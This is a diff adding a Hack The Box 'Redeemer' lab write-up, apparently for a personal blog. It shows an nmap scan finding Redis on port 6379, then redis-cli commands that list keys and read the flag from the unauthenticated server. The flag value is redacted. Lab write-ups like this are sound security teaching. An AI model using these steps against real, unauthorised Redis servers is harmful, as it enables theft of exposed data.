@@ -1,0 +1,72 @@
+export const frontmatter = {
+  title: "Hack The Box Redeemer Machine Writeup",
+  slug: "hack-the-box-redeemer-machine-writeup",
+  category: "HTB Machine",
+  description:
+    "Learn how to enumerate and exploit an exposed Redis server with no authentication enabled using Nmap and redis-cli to retrieve sensitive data.",
+  date: "2026-05-08",
+};
+
+export const metadata = {
+  title:
+    "HackTheBox Redeemer Writeup – Unauthenticated Redis Access | loxcalhost",
+  description:
+    "Step-by-step Redis exploitation writeup demonstrating Nmap enumeration, redis-cli usage, key enumeration, and retrieval of sensitive data from an exposed Redis instance.",
+};
+
+## Introduction
+
+This write-up demonstrates the exploitation of an exposed Redis server with no authentication enabled. After identifying the Redis service on port `6379` through Nmap scanning, we use `redis-cli` to enumerate stored keys and retrieve sensitive data from the database. The lab highlights the risks of insecure Redis configurations exposed to the network.
+
+## Seup
+
+Download a VPN configuration file from the webpage and connect to it via `sudo openvpn file.ovpn`.
+
+> **NOTE:** Replace `file.ovpn` with your VPN configuration file name.
+
+To check if everything is working fine, we can use `ping <ip_addr>`.
+
+## Enumeration
+
+Performa full port scan with version detection with `nmap -sV -p- -T4 <ip_addr>`:
+
+```
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-07 15:18 IST
+Nmap scan report for 10.129.136.187
+Host is up (0.17s latency).
+Not shown: 65198 closed tcp ports (reset), 336 filtered tcp ports (no-response)
+PORT     STATE SERVICE VERSION
+6379/tcp open  redis   Redis key-value store
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 762.16 seconds
+```
+
+Nmap scan reveals that on port `6379`, Redis is an in-memory key-value database often used for caching and fast data storage.
+
+To access it we we will be using `redis-cli`
+
+## Exploitation
+
+First, verify connectivity to the Redis server with `redis-cli -h <ip_addr> PING`:
+
+```
+PONG
+```
+
+Since authentication is not enabled, we can enumerate all stored keys using the `redis-cli -h <ip_addr> KEYS '*'` command:
+
+```
+1) "numb"
+2) "stor"
+3) "flag"
+4) "temp"
+```
+
+To download the flag use `redis-cli -h <ip_addr> GET flag`:
+
+```
+"▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇"
+```
+
+> **Note:** Due to latency and connectivity issues, I used individual Redis commands instead of an interactive session. Under normal circumstances, you can also obtain an interactive Redis shell using `redis-cli -h <ip_addr>`
